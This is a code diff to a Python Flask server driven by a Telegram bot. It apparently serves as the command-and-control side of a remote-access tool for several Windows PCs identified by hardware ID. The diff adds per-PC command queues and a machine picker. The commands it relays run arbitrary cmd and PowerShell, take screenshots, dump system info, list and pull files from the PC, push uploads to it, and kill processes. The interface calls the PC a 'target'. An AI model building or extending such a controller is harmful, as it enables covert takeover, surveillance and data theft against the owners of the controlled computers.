@@ -86,12 +86,15 @@ bot = telebot.TeleBot(settings.bot_token, threaded=False)
 app = Flask(__name__)
 app.config["MAX_CONTENT_LENGTH"] = settings.max_upload_mb * 1024 * 1024
 
-pending_commands: deque[dict[str, object]] = deque()
+# Multi-PC state management
+pending_commands_by_pc: dict[str, deque[dict[str, object]]] = {}
+pc_last_seen: dict[str, dt.datetime] = {}
+selected_pc_by_chat: dict[int, str] = {}
+
 command_ids = count(1)
 queue_lock = Lock()
 state_by_chat: dict[int, str] = {}
 page_by_chat: dict[int, int] = {}
-pc_state = {"last_seen": None}
 
 
 PAGES = [
@@ -199,33 +202,56 @@ def inline_keyboard(page: int = 0) -> telebot.types.InlineKeyboardMarkup:
             else:
                 buttons.append(telebot.types.InlineKeyboardButton(text=btn, callback_data="noop"))
         markup.row(*buttons)
+    # Add persistent Change PC row at the very bottom
+    markup.row(telebot.types.InlineKeyboardButton(text="🖥️ Сменить управляемый ПК", callback_data="change_pc"))
     return markup
 
 
-def enqueue(command: str) -> int:
+def pc_selection_keyboard() -> telebot.types.InlineKeyboardMarkup:
+    markup = telebot.types.InlineKeyboardMarkup()
+    now = utc_now()
+    if not pc_last_seen:
+        markup.row(telebot.types.InlineKeyboardButton(text="Список пуст 🚫", callback_data="noop"))
+    else:
+        for hwid, last_seen in pc_last_seen.items():
+            is_online = (now - last_seen).total_seconds() <= settings.online_ttl_seconds
+            status_emoji = "🟢" if is_online else "🔴"
+            markup.row(telebot.types.InlineKeyboardButton(
+                text=f"{status_emoji} {hwid}",
+                callback_data=f"selectpc:{hwid}"
+            ))
+    markup.row(telebot.types.InlineKeyboardButton(text="🔄 Обновить список", callback_data="refresh_pcs"))
+    return markup
+
+
+def enqueue(hwid: str, command: str) -> int:
     with queue_lock:
+        if hwid not in pending_commands_by_pc:
+            pending_commands_by_pc[hwid] = deque()
         command_id = next(command_ids)
-        pending_commands.append({"id": command_id, "cmd": command})
-    logger.info("Queued command %s: %s", command_id, command[:60])
+        pending_commands_by_pc[hwid].append({"id": command_id, "cmd": command})
+    logger.info("Queued command %s for %s: %s", command_id, hwid, command[:60])
     return command_id
 
 
-def drain_commands() -> list[dict[str, object]]:
+def drain_commands(hwid: str) -> list[dict[str, object]]:
     with queue_lock:
-        commands = list(pending_commands)
-        pending_commands.clear()
+        if hwid not in pending_commands_by_pc:
+            return []
+        commands = list(pending_commands_by_pc[hwid])
+        pending_commands_by_pc[hwid].clear()
     return commands
 
 
-def pc_online() -> bool:
-    last_seen = pc_state.get("last_seen")
+def pc_online(hwid: str) -> bool:
+    last_seen = pc_last_seen.get(hwid)
     if not isinstance(last_seen, dt.datetime):
         return False
     return (utc_now() - last_seen).total_seconds() <= settings.online_ttl_seconds
 
 
-def last_seen_text() -> str:
-    last_seen = pc_state.get("last_seen")
+def last_seen_text(hwid: str) -> str:
+    last_seen = pc_last_seen.get(hwid)
     if not isinstance(last_seen, dt.datetime):
         return "нет данных"
     return last_seen.astimezone().strftime("%Y-%m-%d %H:%M:%S %Z")
@@ -275,7 +301,6 @@ def save_upload(file_storage, filename: str) -> Path:
 # ---------------------------------------------------------------------------
 
 def keepalive_loop() -> None:
-    """Periodically ping our own /health endpoint to keep Railway awake."""
     while True:
         time.sleep(settings.keepalive_interval)
         if not settings.public_url:
@@ -296,7 +321,7 @@ def keepalive_loop() -> None:
 
 @app.get("/")
 def index():
-    return jsonify({"ok": True, "service": "telegram-bot", "pc_online": pc_online()})
+    return jsonify({"ok": True, "service": "telegram-bot", "pcs_connected": len(pc_last_seen)})
 
 
 @app.get("/health")
@@ -322,15 +347,18 @@ def telegram_webhook():
 @app.get("/api/poll")
 def poll():
     require_api_key()
-    pc_state["last_seen"] = utc_now()
-    return jsonify({"commands": drain_commands()})
+    hwid = request.args.get("hwid", "Default-PC")
+    pc_last_seen[hwid] = utc_now()
+    return jsonify({"commands": drain_commands(hwid)})
 
 
 @app.post("/api/result")
 def result():
     require_api_key()
+    hwid = request.args.get("hwid", "Default-PC")
+    prefix = f"🖥️ [{hwid}]:\n"
     try:
-        send_chunks(settings.admin_id, request_text())
+        send_chunks(settings.admin_id, prefix + request_text())
     except Exception:
         logger.exception("Failed to forward result to Telegram")
     return jsonify({"ok": True})
@@ -339,12 +367,14 @@ def result():
 @app.post("/api/photo")
 def photo():
     require_api_key()
+    hwid = request.args.get("hwid", "Default-PC")
     file_storage = request.files.get("photo")
     if not file_storage:
         return jsonify({"ok": False, "error": "photo is required"}), 400
 
     path = save_upload(file_storage, "screen.jpg")
     try:
+        bot.send_message(settings.admin_id, f"📸 Снимок экрана получен от 🖥️ [{hwid}]:")
         with path.open("rb") as file_obj:
             for attempt in range(3):
                 try:
@@ -364,6 +394,7 @@ def photo():
 @app.post("/api/file")
 def file():
     require_api_key()
+    hwid = request.args.get("hwid", "Default-PC")
     file_storage = request.files.get("file")
     filename = request.form.get("filename") or getattr(file_storage, "filename", "file")
     if not file_storage:
@@ -371,6 +402,7 @@ def file():
 
     path = save_upload(file_storage, filename)
     try:
+        bot.send_message(settings.admin_id, f"📥 Файл получен от 🖥️ [{hwid}]:")
         with path.open("rb") as file_obj:
             for attempt in range(3):
                 try:
@@ -416,15 +448,32 @@ def start(message):
     if not is_admin(message):
         return
 
-    page_by_chat[message.chat.id] = 0
-    status = "🟢 онлайн" if pc_online() else "🔴 офлайн"
-    text = (
-        f"👋 Приветствую, мой повелитель!\n\n"
-        f"Статус цели: {status}\n"
-        f"Последний пинг: {last_seen_text()}\n\n"
-        f"Выберите команду на панели управления, сэр: 👇"
-    )
-    bot.send_message(message.chat.id, text, reply_markup=inline_keyboard(0))
+    chat_id = message.chat.id
+    page_by_chat[chat_id] = 0
+
+    # If only 1 PC has connected and it's active, automatically select it!
+    # Otherwise, show PC selection menu.
+    now = utc_now()
+    active_pcs = [hwid for hwid, ls in pc_last_seen.items() if (now - ls).total_seconds() <= settings.online_ttl_seconds]
+
+    if len(active_pcs) == 1:
+        selected_pc_by_chat[chat_id] = active_pcs[0]
+        hwid = active_pcs[0]
+        status = "🟢 онлайн"
+        text = (
+            f"👋 Приветствую, мой повелитель!\n\n"
+            f"🖥️ Выбран ПК: `{hwid}` ({status})\n"
+            f"Последний пинг: {last_seen_text(hwid)}\n\n"
+            f"Выберите команду на панели управления, сэр: 👇"
+        )
+        bot.send_message(chat_id, text, reply_markup=inline_keyboard(0))
+    else:
+        text = (
+            f"👋 Добро пожаловать, шеф!\n\n"
+            f"Обнаружено несколько подключенных ПК ({len(pc_last_seen)} всего, {len(active_pcs)} в сети).\n"
+            f"Пожалуйста, выберите ПК для управления: 👇"
+        )
+        bot.send_message(chat_id, text, reply_markup=pc_selection_keyboard())
 
 
 @bot.callback_query_handler(func=lambda call: True)
@@ -435,14 +484,55 @@ def handle_callback(call):
 
     data = call.data
 
-    if data.startswith("page:"):
+    if data.startswith("selectpc:"):
+        hwid = data.split(":", 1)[1]
+        selected_pc_by_chat[chat_id] = hwid
+        page_by_chat[chat_id] = 0
+        status = "🟢 онлайн" if pc_online(hwid) else "🔴 офлайн"
+        text = (
+            f"🖥️ Подключение к ПК: `{hwid}` прошло успешно!\n\n"
+            f"Текущий статус: {status}\n"
+            f"Последний пинг: {last_seen_text(hwid)}\n\n"
+            f"Управляйте компьютером с помощью панели ниже, сэр: 👇"
+        )
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=call.message.message_id,
+            text=text,
+            reply_markup=inline_keyboard(0)
+        )
+        bot.answer_callback_query(call.id, text=f"Выбран ПК: {hwid}!")
+
+    elif data == "change_pc" or data == "refresh_pcs":
+        now = utc_now()
+        active_pcs = [hwid for hwid, ls in pc_last_seen.items() if (now - ls).total_seconds() <= settings.online_ttl_seconds]
+        text = (
+            f"🖥️ Список подключенных ПК ({len(pc_last_seen)} всего, {len(active_pcs)} в сети).\n"
+            f"Выберите целевую машину для управления, хозяин: 👇"
+        )
+        try:
+            bot.edit_message_text(
+                chat_id=chat_id,
+                message_id=call.message.message_id,
+                text=text,
+                reply_markup=pc_selection_keyboard()
+            )
+        except Exception:
+            pass
+        bot.answer_callback_query(call.id, text="Список обновлен!")
+
+    elif data.startswith("page:"):
         target_page = int(data.split(":")[1])
         page_by_chat[chat_id] = target_page
-        status = "🟢 онлайн" if pc_online() else "🔴 офлайн"
+        hwid = selected_pc_by_chat.get(chat_id)
+        if not hwid:
+            bot.answer_callback_query(call.id, text="Сначала выберите ПК!")
+            return
+
+        status = "🟢 онлайн" if pc_online(hwid) else "🔴 офлайн"
         text = (
-            f"👋 Приветствую, мой повелитель!\n\n"
-            f"Статус цели: {status}\n"
-            f"Последний пинг: {last_seen_text()}\n\n"
+            f"🖥️ Управление ПК: `{hwid}` ({status})\n"
+            f"Последний пинг: {last_seen_text(hwid)}\n\n"
             f"Выберите команду на панели управления, сэр: 👇"
         )
         try:
@@ -457,16 +547,26 @@ def handle_callback(call):
         bot.answer_callback_query(call.id)
 
     elif data.startswith("cmd:"):
+        hwid = selected_pc_by_chat.get(chat_id)
+        if not hwid:
+            bot.answer_callback_query(call.id, text="Ошибка: целевой ПК не выбран!")
+            return
+
         btn_text = data.split(":", 1)[1]
         command, reply = BUTTON_COMMANDS[btn_text]
-        enqueue(command)
+        enqueue(hwid, command)
         bot.answer_callback_query(call.id, text=reply, show_alert=True)
 
     elif data.startswith("prompt:"):
+        hwid = selected_pc_by_chat.get(chat_id)
+        if not hwid:
+            bot.answer_callback_query(call.id, text="Ошибка: целевой ПК не выбран!")
+            return
+
         btn_text = data.split(":", 1)[1]
         state, prompt = PROMPT_ACTIONS[btn_text]
         state_by_chat[chat_id] = state
-        bot.send_message(chat_id, prompt)
+        bot.send_message(chat_id, f"📝 [{hwid}]: " + prompt)
         bot.answer_callback_query(call.id)
 
     elif data == "noop":
@@ -478,13 +578,19 @@ def handle_cmd(message):
     if not is_admin(message):
         return
 
+    chat_id = message.chat.id
+    hwid = selected_pc_by_chat.get(chat_id)
+    if not hwid:
+        bot.send_message(chat_id, "⚠️ Выберите ПК для выполнения команд через /menu!")
+        return
+
     command = message.text.partition(" ")[2].strip()
     if command:
-        enqueue(f"cmd:{command}")
-        bot.send_message(message.chat.id, f"🫡 Слушаюсь! Команда отправлена: {command}")
+        enqueue(hwid, f"cmd:{command}")
+        bot.send_message(chat_id, f"🫡 Слушаюсь! Команда отправлена на 🖥️ [{hwid}]: {command}")
     else:
-        state_by_chat[message.chat.id] = "cmd"
-        bot.send_message(message.chat.id, "Введи CMD-команду, шеф:")
+        state_by_chat[chat_id] = "cmd"
+        bot.send_message(chat_id, f"Введи CMD-команду для 🖥️ [{hwid}], шеф:")
 
 
 @bot.message_handler(commands=["ps"])
@@ -492,27 +598,43 @@ def handle_ps(message):
     if not is_admin(message):
         return
 
+    chat_id = message.chat.id
+    hwid = selected_pc_by_chat.get(chat_id)
+    if not hwid:
+        bot.send_message(chat_id, "⚠️ Выберите ПК для выполнения команд через /menu!")
+        return
+
     command = message.text.partition(" ")[2].strip()
     if command:
-        enqueue(f"ps:{command}")
-        bot.send_message(message.chat.id, f"🫡 Понял! PowerShell запущен: {command}")
+        enqueue(hwid, f"ps:{command}")
+        bot.send_message(chat_id, f"🫡 Понял! PowerShell запущен на 🖥️ [{hwid}]: {command}")
     else:
-        state_by_chat[message.chat.id] = "ps"
-        bot.send_message(message.chat.id, "Введи PowerShell-команду, сэр:")
+        state_by_chat[chat_id] = "ps"
+        bot.send_message(chat_id, f"Введи PowerShell-команду для 🖥️ [{hwid}], сэр:")
 
 
 @bot.message_handler(commands=["screen"])
 def handle_screen(message):
+    chat_id = message.chat.id
     if is_admin(message):
-        enqueue("screen")
-        bot.send_message(message.chat.id, "Опа, делаю фотку, шеф! Сейчас прилетит 📸😎")
+        hwid = selected_pc_by_chat.get(chat_id)
+        if not hwid:
+            bot.send_message(chat_id, "⚠️ Выберите ПК через /menu!")
+            return
+        enqueue(hwid, "screen")
+        bot.send_message(chat_id, f"Опа, делаю фотку на 🖥️ [{hwid}], шеф! Сейчас прилетит 📸😎")
 
 
 @bot.message_handler(commands=["info"])
 def handle_info(message):
+    chat_id = message.chat.id
     if is_admin(message):
-        enqueue("info")
-        bot.send_message(message.chat.id, "Секунду, сэр, сейчас выгружу всю подноготную этого ведра с гайками 🖥️🔍")
+        hwid = selected_pc_by_chat.get(chat_id)
+        if not hwid:
+            bot.send_message(chat_id, "⚠️ Выберите ПК через /menu!")
+            return
+        enqueue(hwid, "info")
+        bot.send_message(chat_id, f"Секунду, сэр, сейчас выгружу всю подноготную этого ведра с гайками 🖥️ [{hwid}] 🔍")
 
 
 @bot.message_handler(commands=["ls"])
@@ -520,9 +642,15 @@ def handle_ls(message):
     if not is_admin(message):
         return
 
+    chat_id = message.chat.id
+    hwid = selected_pc_by_chat.get(chat_id)
+    if not hwid:
+        bot.send_message(chat_id, "⚠️ Выберите ПК через /menu!")
+        return
+
     path = message.text.partition(" ")[2].strip()
-    enqueue(f"ls:{path}")
-    bot.send_message(message.chat.id, "Открываю картотеку, шеф! Загружаю файлы 📂👀")
+    enqueue(hwid, f"ls:{path}")
+    bot.send_message(chat_id, f"Открываю картотеку 🖥️ [{hwid}] шеф! Загружаю файлы 📂👀")
 
 
 @bot.message_handler(commands=["dl"])
@@ -530,13 +658,19 @@ def handle_dl(message):
     if not is_admin(message):
         return
 
+    chat_id = message.chat.id
+    hwid = selected_pc_by_chat.get(chat_id)
+    if not hwid:
+        bot.send_message(chat_id, "⚠️ Выберите ПК через /menu!")
+        return
+
     path = message.text.partition(" ")[2].strip()
     if path:
-        enqueue(f"dl:{path}")
-        bot.send_message(message.chat.id, "Уже тащу этот файл, сэр! 📥")
+        enqueue(hwid, f"dl:{path}")
+        bot.send_message(chat_id, f"Уже тащу этот файл с 🖥️ [{hwid}], сэр! 📥")
     else:
-        state_by_chat[message.chat.id] = "dl"
-        bot.send_message(message.chat.id, "Какой файлик стянуть для вас, сэр? Укажите полный путь:")
+        state_by_chat[chat_id] = "dl"
+        bot.send_message(chat_id, f"Какой файлик стянуть с 🖥️ [{hwid}], сэр? Укажите полный путь:")
 
 
 @bot.message_handler(commands=["kill"])
@@ -544,17 +678,29 @@ def handle_kill(message):
     if not is_admin(message):
         return
 
+    chat_id = message.chat.id
+    hwid = selected_pc_by_chat.get(chat_id)
+    if not hwid:
+        bot.send_message(chat_id, "⚠️ Выберите ПК через /menu!")
+        return
+
     process = message.text.partition(" ")[2].strip()
     if process:
-        enqueue(f"kill:{process}")
-        bot.send_message(message.chat.id, f"🔫 Устраняю процесс {process}, сэр!")
+        enqueue(hwid, f"kill:{process}")
+        bot.send_message(chat_id, f"🔫 Устраняю процесс {process} на 🖥️ [{hwid}], сэр!")
     else:
-        state_by_chat[message.chat.id] = "kill"
-        bot.send_message(message.chat.id, "Имя процесса или PID на ликвидацию, шеф:")
+        state_by_chat[chat_id] = "kill"
+        bot.send_message(chat_id, f"Имя процесса или PID на ликвидацию на 🖥️ [{hwid}], шеф:")
 
 
 @bot.message_handler(content_types=["document"], func=is_admin)
 def handle_document(message):
+    chat_id = message.chat.id
+    hwid = selected_pc_by_chat.get(chat_id)
+    if not hwid:
+        bot.send_message(chat_id, "⚠️ Выберите ПК через /menu перед отправкой файлов!")
+        return
+
     filename = message.document.file_name or "file"
     safe_name = secure_filename(filename) or "file"
     target = settings.upload_dir / f"for_pc_{safe_name}"
@@ -563,11 +709,11 @@ def handle_document(message):
         file_info = bot.get_file(message.document.file_id)
         data = bot.download_file(file_info.file_path)
         target.write_bytes(data)
-        enqueue(f"upload:{safe_name}")
-        bot.send_message(message.chat.id, "📥 Принял файлик! Поставил в очередь на загрузку, сэр!")
+        enqueue(hwid, f"upload:{safe_name}")
+        bot.send_message(chat_id, f"📥 Принял файлик! Поставил в очередь на загрузку для 🖥️ [{hwid}], сэр!")
     except Exception as exc:
         logger.exception("Failed to queue Telegram document")
-        bot.send_message(message.chat.id, f"Упс, фатальная ошибочка при загрузке: {exc}")
+        bot.send_message(chat_id, f"Упс, фатальная ошибочка при загрузке: {exc}")
 
 
 @bot.message_handler(content_types=["text"], func=is_admin)
@@ -575,20 +721,26 @@ def handle_text(message):
     text = message.text.strip()
     chat_id = message.chat.id
 
+    hwid = selected_pc_by_chat.get(chat_id)
+    if not hwid:
+        # If no PC is selected, they typed something or just started
+        start(message)
+        return
+
     state = state_by_chat.pop(chat_id, None)
     if state:
         command = STATE_TO_COMMAND.get(state)
         if command:
-            enqueue(f"{command}:{text}")
-            bot.send_message(chat_id, f"🫡 Так точно! Отправил команду {command} с вашими параметрами.")
+            enqueue(hwid, f"{command}:{text}")
+            bot.send_message(chat_id, f"🫡 Так точно! Отправил команду {command} на 🖥️ [{hwid}] с вашими параметрами.")
         return
 
     if text == "📊 Статус":
-        status = "🟢 Онлайн" if pc_online() else "🔴 Офлайн"
-        bot.send_message(chat_id, f"{status}\nПоследний пинг: {last_seen_text()}")
+        status = "🟢 Онлайн" if pc_online(hwid) else "🔴 Офлайн"
+        bot.send_message(chat_id, f"🖥️ ПК: `{hwid}` ({status})\nПоследний пинг: {last_seen_text(hwid)}")
         return
 
-    bot.send_message(chat_id, "Хм, сэр, я вас не совсем понял. Воспользуйтесь нашей божественной интерактивной панелью: /menu")
+    bot.send_message(chat_id, f"Хм, сэр, я вас не совсем понял. Воспользуйтесь нашей панелью управления для `{hwid}` или выберите другой ПК: /menu")
 
 
 # ---------------------------------------------------------------------------
